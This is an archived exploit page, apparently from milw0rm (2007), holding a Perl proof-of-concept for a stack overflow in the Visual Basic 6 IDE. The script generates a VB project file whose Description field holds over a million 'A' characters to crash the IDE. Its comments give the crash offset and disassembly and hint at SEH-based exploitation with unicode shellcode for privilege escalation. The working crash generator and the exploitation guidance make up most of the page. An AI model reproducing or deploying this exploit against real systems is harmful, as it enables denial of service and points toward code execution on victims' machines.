<html><head><title>Microsoft Visual Basic 6.0 Project (Description) Stack overflow PoC</title></head><pre>#!/usr/local/bin/perl


#Discovered By UmZ (Umair Manzoor)
#comments are welcome at umz32.dll[at]gmail.com
#Dated 23-02-2007
#Time : 02:00 AM PST
#
#Stack Overflow
#Buffer Size 1037690
#overflow offset  004A2E43
#EBX contain values 
#Memory to write 03B50188
#
#
#
#
#Visual Basic Project Description Stack overflow
#Affected Version  : Tested on Visual basic 6
#Threats : DoS, Previlidges Escilation
#From : Local system
#
#
#Details:
#  Microsoft Visual Basic 6.0 IDE crashes while parsing the project detail's field when characters more then 1037690 are provided, 
#  causing stack overflow (vuln1.vbp in attached file). The data is stored as UNICODE means that Shellcode can be injected in unicode manner 
#  to escilate previledges.
#    As soon as the stack get overflow, an exception occur and NTDLL start handling it =&gt; means that SEH based exploitation will work.
#   Offset is mentioned above at which IDE crash. Register EBX contain the malicious values.
#   Memory address at which the malicous data (Project detail) are dumped is: 03EF0189 and on words.
#
#OVERFLOW CODE n Instructions:
#
#004A2E43  |. 8501           TEST DWORD PTR DS:[ECX],EAX
#004A2E45  |. 3D 00100000    CMP EAX,1000
#004A2E4A  |.^73 EC          JNB SHORT VB6.004A2E38
#004A2E4C  \.^EB DB          JMP SHORT VB6.004A2E29

#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
#		        Please do not use it against any system without prior permission.
#          		You are responsible for yourself for what you do with this code.

# This exploit is just POC, it will generate the crafted VB project.


print(&quot;\nVisual Basic Project Description Stack overflow&quot;);
print(&quot;\nAffected Version  : Tested on Visual basic 6&quot;);
print(&quot;\nThreats : DoS, Previlidges Escilation&quot;);
print(&quot;\nFrom : Local system&quot;);
print(&quot;\n----------------------------------------------&quot;);
print(&quot;\nDiscovered &amp; Coded by UmZ&quot;); 
print(&quot;\numz32.dll[at]gmail.com&quot;);
 

open (MYFILE, '&gt;&gt;Form1.frm');
print MYFILE &quot;VERSION 5.00\n&quot;;
print MYFILE &quot;Begin VB.Form Form1\n&quot;; 
print MYFILE q(Caption         =   &quot;Form1&quot;);
print MYFILE &quot;\nClientHeight    =   3495\n&quot;;
print MYFILE &quot;ClientLeft      =   60\n&quot;;
print MYFILE &quot;ClientTop       =   345\n&quot;;
print MYFILE &quot;ClientWidth     =   4680\n&quot;;
print MYFILE q(LinkTopic       =   &quot;Form1&quot;);
print MYFILE &quot;\nScaleHeight     =   3495\n&quot;;
print MYFILE &quot;ScaleWidth      =   4680\n&quot;;
print MYFILE &quot;StartUpPosition =   3  'Windows Default\n&quot;;
print MYFILE &quot;Begin VB.CommandButton Command2\n&quot;; 
print MYFILE q(Caption         =   &quot;write&quot;);
print MYFILE &quot;\nHeight          =   495\n&quot;;
print MYFILE &quot;Left            =   2400\n&quot;;
print MYFILE &quot;TabIndex        =   2\n&quot;;
print MYFILE &quot;Top             =   2640\n&quot;;
print MYFILE &quot;Width           =   1935\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;Begin VB.TextBox Text1\n&quot;; 
print MYFILE &quot;Height          =   2175\n&quot;;
print MYFILE &quot;Left            =   480\n&quot;;
print MYFILE &quot;MultiLine       =   -1  'True\n&quot;;
print MYFILE &quot;TabIndex        =   1\n&quot;;
print MYFILE q(Text            =   &quot;Form1.frx&quot;:0000);
print MYFILE &quot;\nTop             =   360\n&quot;;
print MYFILE &quot;Width           =   3855\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;Begin VB.CommandButton Command1\n&quot;; 
print MYFILE q(Caption         =   &quot;read&quot;);
print MYFILE &quot;\nHeight          =   495\n&quot;;
print MYFILE &quot;Left            =   480\n&quot;;
print MYFILE &quot;TabIndex        =   0\n&quot;;
print MYFILE &quot;Top             =   2640\n&quot;;
print MYFILE &quot;Width           =   1935\n&quot;;
print MYFILE &quot;End\n&quot;;
print MYFILE &quot;End\n&quot;;

print MYFILE q(Attribute VB_Name = &quot;Form1&quot;);
print MYFILE &quot;\nAttribute VB_GlobalNameSpace = False\n&quot;;
print MYFILE &quot;Attribute VB_Creatable = False\n&quot;;
print MYFILE &quot;Attribute VB_PredeclaredId = True\n&quot;;
print MYFILE &quot;Attribute VB_Exposed = False\n&quot;;
close (MYFILE);

open (MYFILE, '&gt;&gt;vuln1.vbp');
print MYFILE &quot;Type=Exe\n&quot;;
print MYFILE &quot;Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\..\\WINDOWS\\system32\\stdole2.tlb#OLE Automation\n&quot;;
print MYFILE &quot;Reference=*\\G{420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#..\\..\\..\\..\\WINDOWS\\system32\\scrrun.dll#Microsoft Scripting Runtime\n&quot;;
print MYFILE &quot;Form=Form1.frm\n&quot;;
print MYFILE q(Startup=&quot;Form1&quot;);
print MYFILE &quot;\nHelpFile=&quot;.q(&quot;&quot;);
print MYFILE &quot;\nCommand32=&quot;.q(&quot;&quot;);
print MYFILE &quot;\nName=&quot;.q(&quot;Project1&quot;);
print MYFILE &quot;\nHelpContextID=&quot;.q(&quot;0&quot;);
print MYFILE &quot;\nDescription=&quot;.q(&quot;).&quot;A&quot; x1037690 .q(&quot;);
print MYFILE &quot;\nCompatibleMode=&quot;.q(&quot;0&quot;);
print MYFILE &quot;\nMajorVer=1&quot;;
print MYFILE &quot;\nMinorVer=0&quot;;
print MYFILE &quot;\nRevisionVer=0&quot;;
print MYFILE &quot;\nAutoIncrementVer=0&quot;;
print MYFILE &quot;\nServerSupportFiles=0&quot;;
print MYFILE &quot;\nVersionCompanyName=&quot;.q(&quot;&quot;);
print MYFILE &quot;\nCompilationType=0&quot;;
print MYFILE &quot;\nOptimizationType=0&quot;;
print MYFILE &quot;\nFavorPentiumPro(tm)=0&quot;;
print MYFILE &quot;\nCodeViewDebugInfo=0&quot;;
print MYFILE &quot;\nNoAliasing=0&quot;;
print MYFILE &quot;\nBoundsCheck=0&quot;;
print MYFILE &quot;\nOverflowCheck=0&quot;;
print MYFILE &quot;\nFlPointCheck=0&quot;;
print MYFILE &quot;\nFDIVCheck=0&quot;;
print MYFILE &quot;\nUnroundedFP=0&quot;;
print MYFILE &quot;\nStartMode=0&quot;;
print MYFILE &quot;\nUnattended=0&quot;;
print MYFILE &quot;\nRetained=0&quot;;
print MYFILE &quot;\nThreadPerObject=0&quot;;
print MYFILE &quot;\nMaxNumberOfThreads=1&quot;;
print MYFILE &quot;\n[MS Transaction Server]&quot;;
print MYFILE &quot;\nAutoRefresh=1&quot;;

close (MYFILE);

print(&quot;\n\nCrafted Project has been generated!!!\n\n&quot;);

# milw0rm.com [2007-05-23]</pre></html>